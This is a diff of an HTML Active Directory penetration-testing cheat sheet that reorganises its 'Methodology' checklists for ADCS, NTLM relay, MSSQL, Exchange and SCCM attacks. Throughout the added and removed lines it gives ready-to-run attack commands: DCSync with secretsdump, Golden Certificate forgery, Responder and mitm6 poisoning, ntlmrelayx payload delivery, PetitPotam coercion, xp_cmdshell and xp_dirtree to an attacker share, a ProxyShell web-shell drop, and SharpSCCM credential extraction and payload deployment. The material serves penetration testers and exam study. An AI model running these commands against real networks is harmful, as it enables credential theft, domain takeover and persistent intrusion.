-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-5a"> Feed the hash into DCSync or the TGT into further Kerberos-based operations.
-<pre><code class="language-bash">secretsdump.py -hashes :&lt;ntlm-hash&gt; &lt;domain.local&gt;/administrator@&lt;dc-ip&gt; -just-dc</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-adcs-methodology-wf-6"> Where the CA private key is recoverable, forge a Golden Certificate for indefinite persistence.
-<pre><code class="language-bash">certipy ca -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -backup -ca '&lt;ca-name&gt;'
-certipy forge -ca-pfx ca.pfx -upn administrator@&lt;domain.local&gt; -subject 'CN=Administrator,CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;'</code></pre>
-</li>
+<li><input type="checkbox" data-id="cape-adcs-auth-wf-0"> Authenticate with the certificate to obtain a TGT and the target's NTLM hash: <code>certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;</code>.</li>
+<li><input type="checkbox" data-id="cape-adcs-auth-wf-1"> Feed the NTLM hash into DCSync or use the TGT for further Kerberos operations.</li>
 </ul>
+
 <h2 id="cape-ntlm-relay-10">10. NTLM Relay Attacks</h2>
 <p>NTLM has one property that keeps it interesting: it is coercible. If I can force a victim to authenticate to a machine I control, and signing is not enforced at the far end, I can relay that authentication verbatim to a third-party service and act as the victim there. Coercion primitives keep multiplying (PetitPotam, DFSCoerce, WebClient triggers, and older printer-bug flavours), and every new one extends the reach of relay against DCs, ADCS Web Enrollment, and any SMB target where signing was left off.</p>
 <p>Responder handles the poisoning half of the chain, ntlmrelayx handles the relay itself. The trick to running them together cleanly is turning off Responder's own SMB and HTTP listeners so ntlmrelayx can catch the traffic instead.</p>
 <p style="text-align:center;"><img src="./img/cape/ntlm-relay-attack.png" alt="NTLM relay attack flow from victim through attacker to target service" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+
+<h3 id="cape-ntlm-workflow">10.0 Baseline Workflow</h3>
+<p>Every relay chain shares the same first three steps: pick a target where signing is off, boot Responder without SMB/HTTP so ntlmrelayx catches the traffic, then coerce or wait for auth. The technique-specific methodology blocks below build on this baseline.</p>
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-ntlm-workflow-wf-0"> Scan the target segment for SMB signing state: <code>nmap --script=smb2-security-mode -p 445 &lt;subnet&gt;</code>.</li>
+<li><input type="checkbox" data-id="cape-ntlm-workflow-wf-1"> Turn off Responder's SMB and HTTP listeners so <code>ntlmrelayx</code> can bind to those ports.</li>
+<li><input type="checkbox" data-id="cape-ntlm-workflow-wf-2"> Start Responder and <code>ntlmrelayx</code> in parallel; wait for or force NTLM authentication.</li>
+</ul>
 
 <h3 id="cape-ntlm-llmnr">10.1 LLMNR Poisoning</h3>
 
@@ -2387,6 +2514,12 @@ certipy forge -ca-pfx ca.pfx -upn administrator@&lt;domain.local&gt; -subject 'C
 <pre><code class="language-bash">echo "admin::N46iSNekpT:08ca45b7d7ea58ee:<ntlmv2-hash>" &gt; hash.txt
 hashcat -m 5600 hash.txt /path/to/wordlist.txt</code></pre>
 <p>Mode 5600 = NetNTLMv2. RockYou often cracks weak passwords in seconds.</p>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-ntlm-llmnr-wf-0"> Run <code>responder -I &lt;iface&gt; -rdwv</code> on the target VLAN and wait for a broadcast name lookup that DNS fails to resolve.</li>
+<li><input type="checkbox" data-id="cape-ntlm-llmnr-wf-1"> Collect the NTLMv2 handshake to <code>Responder-Session.log</code>, then crack with <code>hashcat -m 5600</code>.</li>
+</ul>
 
 <h3 id="cape-ntlm-smb-relay">10.2 SMB Relay</h3>
 <p>Rather than crack the hash, relay it directly to another SMB service. Requirements:</p>
@@ -2439,6 +2572,13 @@ nc 127.0.0.1 &lt;port&gt;</code></pre>
 <p>Interactive shell via psexec:</p>
 <pre><code class="language-bash">python3 psexec.py <domain.local>/fcastle:<password>@<target-ip></code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-ntlm-smb-relay-wf-0"> Confirm the relayed identity is a local admin on the target host; SMB relay without admin gets you nothing usable.</li>
+<li><input type="checkbox" data-id="cape-ntlm-smb-relay-wf-1"> Run <code>ntlmrelayx.py -tf targets.txt -smb2support</code>, then choose <code>-e payload.exe</code>, <code>-c "cmd"</code>, or <code>-i</code> depending on the goal.</li>
+<li><input type="checkbox" data-id="cape-ntlm-smb-relay-wf-2"> After a successful relay, dump SAM / LSA on the target and reuse extracted hashes for lateral movement.</li>
+</ul>
+
 <h3 id="cape-ntlm-capture-hashes">10.3 Capturing Hashes with Responder</h3>
 <p>Responder is the flagship name-resolution poisoning tool. It targets three broadcast protocols Windows falls back to when DNS fails: LLMNR, NBT-NS, and mDNS.</p>
 
@@ -2481,6 +2621,12 @@ nc 127.0.0.1 &lt;port&gt;</code></pre>
 <pre><code class="language-bash">echo "ddumpster::LANDFILL:112233...000000" &gt; hashes.txt
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-ntlm-capture-wf-0"> Run <code>responder -I &lt;iface&gt; -dwPv</code> with all poisoners on, plus rogue WPAD and forced NTLM auth.</li>
+<li><input type="checkbox" data-id="cape-ntlm-capture-wf-1"> Collect NTLMv2 hashes from <code>Responder-Session.log</code> and crack with <code>hashcat -m 5600</code>.</li>
+</ul>
+
 <h3 id="cape-ntlm-ldap-relay">10.4 Relay to LDAP for DACL Escalation</h3>
 <p>Relaying NTLM to LDAP does not give a shell but does give write access to the directory as the relayed user. Two useful primitives when the relayed identity is a computer account (typical after coercion): grant DCSync rights to an attacker-controlled principal, and configure Resource-Based Constrained Delegation onto the relayed computer.</p>
 <pre><code class="language-bash"># Relay to LDAP over LDAPS and escalate a low-priv account to Domain Sync rights
@@ -2491,6 +2637,13 @@ ntlmrelayx.py -t ldaps://&lt;dc-fqdn&gt; --delegate-access
 
 # Follow up: the low-priv account now has DCSync
 secretsdump.py &lt;domain.local&gt;/&lt;low-priv-user&gt;:'&lt;password&gt;'@&lt;dc-ip&gt; -just-dc-ntlm</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-ntlm-ldap-relay-wf-0"> Relay to LDAPS (LDAP signing usually blocks LDAP relays but leaves LDAPS open).</li>
+<li><input type="checkbox" data-id="cape-ntlm-ldap-relay-wf-1"> Use <code>--escalate-user</code> to grant DCSync to a low-priv account, or <code>--delegate-access</code> to set RBCD on the relayed computer.</li>
+<li><input type="checkbox" data-id="cape-ntlm-ldap-relay-wf-2"> Verify with <code>secretsdump.py -just-dc-ntlm</code>.</li>
+</ul>
 
 <h3 id="cape-ntlm-certipy-relay">10.4a Certipy Relay Mode</h3>
 <p>Certipy ships with a built-in relay mode that combines the coercion, the relay to ADCS Web Enrolment or ICPR, and the certificate collection into a single command. It removes the two-terminal juggle of ntlmrelayx + coercer and reports the resulting PFX inline.</p>
@@ -2512,12 +2665,25 @@ ntlmrelayx.py -t http://&lt;ca-fqdn&gt;/certsrv/certfnsh.asp --adcs --template D
 python3 PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;attacker-ip&gt; &lt;target-dc&gt;
 certipy auth -pfx &lt;dc&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-ntlm-adcs-relay-wf-0"> Point <code>ntlmrelayx --adcs --template DomainController</code> at <code>http://&lt;ca&gt;/certsrv/certfnsh.asp</code>.</li>
+<li><input type="checkbox" data-id="cape-ntlm-adcs-relay-wf-1"> Coerce the DC with PetitPotam, DFSCoerce, or PrinterBug; the relayed cert authenticates as the DC via PKINIT.</li>
+<li><input type="checkbox" data-id="cape-ntlm-adcs-relay-wf-2"> Authenticate with the resulting PFX to receive the DC's TGT and NTLM hash for DCSync.</li>
+</ul>
+
 <h3 id="cape-ntlm-mssql-relay">10.6 Relay to MSSQL</h3>
 <p>MSSQL supports NTLM auth and is often reachable from segments that cannot reach LDAP or SMB. Relaying to MSSQL gives a database session under the relayed identity, which is usually enough to abuse xp_cmdshell where the relayed account is a sysadmin.</p>
 <pre><code class="language-bash">ntlmrelayx.py -t mssql://&lt;target-fqdn&gt; -q 'EXEC xp_cmdshell "whoami"'
 
 # Multiple queries interactively via the socks proxy mode
 ntlmrelayx.py -t mssql://&lt;target-fqdn&gt; -socks</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-ntlm-mssql-relay-wf-0"> Verify the relayed identity has sysadmin (or equivalent) on the target instance.</li>
+<li><input type="checkbox" data-id="cape-ntlm-mssql-relay-wf-1"> Relay to MSSQL with <code>-q 'EXEC xp_cmdshell "&lt;cmd&gt;"'</code>, or use <code>-socks</code> for interactive follow-up.</li>
+</ul>
 
 <h3 id="cape-ntlm-mitm6">10.7 mitm6, IPv6 as a Poisoning Route</h3>
 <p>Windows prefers IPv6 over IPv4 when both are available. On most enterprise networks IPv6 is enabled but not configured, which means a rogue DHCPv6 responder can register itself as the network's DNS server. mitm6 does exactly that, then answers every AAAA query with its own address. Combined with ntlmrelayx it captures authentication that would otherwise never travel via LLMNR.</p>
@@ -2526,6 +2692,12 @@ mitm6 -i eth0 -d &lt;domain.local&gt;
 
 # Relay the resulting NTLM in a second terminal
 ntlmrelayx.py -6 -wh &lt;attacker-fqdn&gt; -t ldaps://&lt;dc-fqdn&gt; --escalate-user &lt;low-priv-user&gt;</code></pre>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-ntlm-mitm6-wf-0"> Run <code>mitm6 -i &lt;iface&gt; -d &lt;domain.local&gt;</code> to hand out yourself as the DNS server via DHCPv6.</li>
+<li><input type="checkbox" data-id="cape-ntlm-mitm6-wf-1"> Relay the intercepted authentication with <code>ntlmrelayx -6 -wh &lt;attacker-fqdn&gt;</code> against LDAPS.</li>
+</ul>
 
 <h3 id="cape-ntlm-coercion-primitives">10.8 Coercion Primitives</h3>
 <p>Every relay attack starts with coerced authentication. The primitives keep multiplying as Microsoft patches individual RPC methods, so it is worth knowing the current live set.</p>
@@ -2541,33 +2713,12 @@ SpoolSample.exe &lt;target&gt; &lt;attacker-fqdn&gt;
 # Coercer: a Swiss-army tool that tries every known primitive against a target
 coercer coerce -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; -l &lt;attacker-ip&gt; -t &lt;target&gt;</code></pre>
 
-<h3 id="cape-ntlm-methodology">10.9 Methodology</h3>
+<h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-ntlm-methodology-wf-0"> Scan target segment for hosts without required SMB signing.
-<pre><code class="language-bash">nmap --script=smb2-security-mode.nse -p 445 &lt;subnet&gt;</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ntlm-methodology-wf-1"> Configure Responder, turn off SMB and HTTP listeners if planning to relay.
-<pre><code class="language-bash">sed -i 's/SMB = On/SMB = Off/' /usr/share/responder/Responder.conf
-sed -i 's/HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ntlm-methodology-wf-2"> Start Responder and ntlmrelayx simultaneously.
-<pre><code class="language-bash">sudo responder -I eth0 -rdwv
-python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ntlm-methodology-wf-3"> Wait for or force NTLM auth (login, share access, misconfigured web app).</li>
-<li><input type="checkbox" data-id="cape-ntlm-methodology-wf-4"> On successful relay, dump SAM, deliver a payload, or drop into interactive mode.
-<pre><code class="language-bash">python ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
-python ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
-python ntlmrelayx.py -tf targets.txt -smb2support -i</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ntlm-methodology-wf-5"> Where relay isn't possible, capture NTLMv2 hashes and crack with Hashcat mode 5600.
-<pre><code class="language-bash">hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-ntlm-methodology-wf-6"> Consider MS-EFSR (PetitPotam) or MS-DFSNM (DFSCoerce) coercions to force DC authentication for relay to ADCS Web Enrollment.
-<pre><code class="language-bash">python3 PetitPotam.py -u user -p pass -d domain.local &lt;attacker&gt; &lt;dc&gt;
-python ntlmrelayx.py -t http://&lt;ca&gt;/certsrv/certfnsh.asp --adcs --template DomainController</code></pre>
-</li>
+<li><input type="checkbox" data-id="cape-ntlm-coerce-wf-0"> Start with PetitPotam (MS-EFSR); fall back to DFSCoerce (MS-DFSNM) or PrinterBug (MS-RPRN) when patched.</li>
+<li><input type="checkbox" data-id="cape-ntlm-coerce-wf-1"> Sweep unknown targets with <code>coercer coerce</code> to enumerate which primitives still trigger.</li>
 </ul>
+
 <h2 id="cape-adcs-attacks-11">11. Active Directory Trust Attacks</h2>
 <p>Trust relationships between forests exist to let users, groups, and services cross a boundary that would otherwise be closed. The same pathway is what turns a compromise in one forest into an incident in another. Three techniques cover most of what I use in practice: forged inter-realm TGTs, MSSQL database link chains, and unconstrained delegation coercion across the trust. Each has a different prerequisite set and a different noise profile, and it is worth knowing all three before touching a trust boundary in earnest.</p>
 <p style="text-align:center;"><img src="./img/cape/ad-forest-domain-structure.png" alt="Active Directory forest and domain structure showing trust relationships" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
@@ -3602,6 +3753,15 @@ EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
 -- Then load a signed .NET assembly (PowerUpSQL wraps this whole flow)
 CREATE ASSEMBLY [&lt;assembly-name&gt;] FROM 0x&lt;hex-blob&gt; WITH PERMISSION_SET = UNSAFE;</code></pre>
 
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-0"> Enumerate reachable MSSQL SPNs and hosts (<code>Get-SQLInstanceDomain</code>, <code>PowerUpSQL</code>, <code>impacket-mssqlclient</code>).</li>
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-1"> Test <code>xp_cmdshell</code> availability and toggle it via <code>sp_configure</code> if it's disabled but you hold sysadmin.</li>
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-2"> Enumerate <code>IMPERSONATE</code> grants and walk the <code>EXECUTE AS</code> chain up to <code>sa</code>.</li>
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-3"> Coerce SQL out to a UNC path (<code>xp_dirtree</code>) when direct code execution is not reachable, then capture or relay the service-account hash.</li>
+<li><input type="checkbox" data-id="cape-mssql-attacks-wf-4"> If OLE Automation is enabled, use <code>sp_OACreate</code>-based execution as a fallback when <code>xp_cmdshell</code> is blocked.</li>
+</ul>
+
 <h3 id="cape-exchange">14.2 Exchange Attacks</h3>
 <p>Older Exchange installers dropped the <strong>Exchange Windows Permissions</strong> group into the domain root with <code>WriteDacl</code> over the domain object. Any principal that owned an Exchange server therefore owned the domain, which is what PrivExchange turns into a one-shot escalation. Newer installers scope those rights down, but a lot of environments were never re-permissioned after upgrade.</p>
 
@@ -3630,6 +3790,14 @@ curl -k 'https://&lt;exchange-fqdn&gt;/autodiscover/autodiscover.json?a=x@x.loca
 python3 proxyshell.py -u '&lt;exchange-fqdn&gt;' -e '&lt;target-mailbox&gt;@&lt;domain.local&gt;'
 # Successful run drops a mail-based web shell reachable at /aspnet_client/&lt;name&gt;.aspx</code></pre>
 <p>The chain has been patched since April 2021, but Exchange servers frequently lag on patching, so it remains worth checking on any Exchange-hosting environment.</p>
+
+<h5>Methodology</h5>
+<ul class="methodology-checklist">
+<li><input type="checkbox" data-id="cape-exchange-attacks-wf-0"> Locate the Exchange server by SPN (<code>setspn -T &lt;domain&gt; -Q */* | Select-String exchange</code>) or by nmap on Exchange ports.</li>
+<li><input type="checkbox" data-id="cape-exchange-attacks-wf-1"> Check for PrivExchange: coerce Exchange to authenticate to <code>ntlmrelayx --escalate-user</code> pointed at LDAP.</li>
+<li><input type="checkbox" data-id="cape-exchange-attacks-wf-2"> Test the build for ProxyLogon and ProxyShell exposure against <code>/autodiscover/autodiscover.json?a=x@x.local</code>.</li>
+<li><input type="checkbox" data-id="cape-exchange-attacks-wf-3"> On escalation, DCSync with <code>secretsdump.py -just-dc-ntlm</code> using the granted rights.</li>
+</ul>
 
 <h3 id="cape-sccm">14.3 SCCM Attacks</h3>
 <p>System Center Configuration Manager (also known as MECM/Endpoint Configuration Manager) deploys software and configuration to every joined host, a compromise of SCCM typically leads to compromise of every managed endpoint.</p>
@@ -3667,36 +3835,13 @@ python3 PXEThief.py decrypt -f &lt;policy-blob&gt;
 SharpSCCM.exe get naa</code></pre>
 <p>The NAA credential is typically a domain account whose password rarely rotates, which turns this into both an initial-access primitive against the SCCM environment and a long-lived credential for lateral movement.</p>
 
-<h3 id="cape-mssql-methodology">14.4 Methodology</h3>
+<h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-mssql-methodology-wf-0"> Enumerate MSSQL, Exchange, and SCCM SPNs and hosts.
-<pre><code class="language-powershell">Get-SQLInstanceDomain
-setspn -T &lt;domain&gt; -Q */* | Select-String "exchange"
-Get-ADObject -Filter {ObjectClass -eq 'mSSMSSite'} -SearchBase 'CN=System Management,CN=System,DC=domain,DC=local'</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-mssql-methodology-wf-1"> Test <code>xp_cmdshell</code> and impersonation on every reachable MSSQL instance.
-<pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-EXEC xp_cmdshell 'whoami';
-EXECUTE AS LOGIN = 'sa'; SELECT SUSER_SNAME();</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-mssql-methodology-wf-2"> Coerce SQL authentication with UNC path injection when direct access isn't possible.
-<pre><code class="language-sql">EXEC master..xp_dirtree '\\attacker\share\';</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-mssql-methodology-wf-3"> Test Exchange for PrivExchange and ProxyLogon exposure; relay to LDAP for DCSync escalation.
-<pre><code class="language-bash">python3 ntlmrelayx.py -t ldap://&lt;dc&gt; --escalate-user &lt;low_priv_user&gt;
-python3 privexchange.py -ah &lt;attacker&gt; &lt;exchange&gt; -u user -p pass -d domain.local
-secretsdump.py domain.local/user:pass@&lt;dc&gt; -just-dc-ntlm</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-mssql-methodology-wf-4"> Locate SCCM primary sites and management points; extract NAA credentials.
-<pre><code class="language-bash">SharpSCCM.exe get devices
-SharpSCCM.exe get site-info
-SharpSCCM.exe local secrets --method wmi</code></pre>
-</li>
-<li><input type="checkbox" data-id="cape-mssql-methodology-wf-5"> Use SCCM's legitimate deployment channels for lateral movement, code executes as SYSTEM on managed endpoints.
-<pre><code class="language-bash">SharpSCCM.exe exec -d &lt;target_device&gt; -p &lt;payload_path&gt;
-SharpSCCM.exe invoke client-push -t &lt;attacker&gt;</code></pre>
-</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-0"> Locate SCCM primary sites and management points via the <code>System Management</code> AD container and <code>SharpSCCM get site-info</code>.</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-1"> Extract NAA credentials on any client host with <code>SharpSCCM local secrets --method wmi</code>.</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-2"> Trigger client-push authentication and relay to SMB or LDAP with <code>ntlmrelayx</code>.</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-3"> With Application Administrator or above, deploy a payload to a target device or collection using <code>SharpSCCM exec</code>.</li>
+<li><input type="checkbox" data-id="cape-sccm-attacks-wf-4"> On networks with PXE enabled, pull OSD media with PXEThief and decrypt the embedded NAA blob.</li>
 </ul>
 
 </div>
@@ -3891,7 +4036,6 @@ SharpSCCM.exe invoke client-push -t &lt;attacker&gt;</code></pre>
       <a href="#cape-kerberos-unpac">6.16 UnPAC-the-Hash</a>
       <a href="#cape-kerberos-ntds-cracking">6.17 Cracking ntds.dit</a>
       <a href="#cape-kerberos-ldap-passback">6.18 LDAP Pass-back</a>
-      <a href="#cape-kerberos-methodology">6.19 Methodology</a>
     </div>
   </div>
   <div class="section-flow-7">
@@ -3945,7 +4089,6 @@ SharpSCCM.exe invoke client-push -t &lt;attacker&gt;</code></pre>
       <a href="#cape-dacl2-noPac">8.11 sAMAccountName Spoofing (noPac)</a>
       <a href="#cape-dacl2-spn-jacking">8.12 SPN Jacking</a>
       <a href="#cape-dacl2-logon-scripts">8.13 Logon Script Attacks</a>
-      <a href="#cape-dacl2-methodology">8.14 Methodology</a>
     </div>
   </div>
   <div class="section-flow-9">
@@ -3988,7 +4131,6 @@ SharpSCCM.exe invoke client-push -t &lt;attacker&gt;</code></pre>
           <a href="#cape-adcs-certipy-auth">9.3.18 Authentication</a>
         </div>
       </div>
-      <a href="#cape-adcs-methodology">9.4 Methodology</a>
     </div>
   </div>
   <div class="section-flow-10">
@@ -4038,7 +4180,6 @@ SharpSCCM.exe invoke client-push -t &lt;attacker&gt;</code></pre>
       <a href="#cape-ntlm-mssql-relay">10.6 MSSQL Relay</a>
       <a href="#cape-ntlm-mitm6">10.7 mitm6 IPv6 Route</a>
       <a href="#cape-ntlm-coercion-primitives">10.8 Coercion Primitives</a>
-      <a href="#cape-ntlm-methodology">10.9 Methodology</a>
     </div>
   </div>
   <div class="section-flow-11">
@@ -4254,7 +4395,6 @@ SharpSCCM.exe invoke client-push -t &lt;attacker&gt;</code></pre>
           <a href="#cape-sccm-pxe">14.3.5 PXE Credential Extraction</a>
         </div>
       </div>
-      <a href="#cape-mssql-methodology">14.4 Methodology</a>
     </div>
   </div>
   </div>
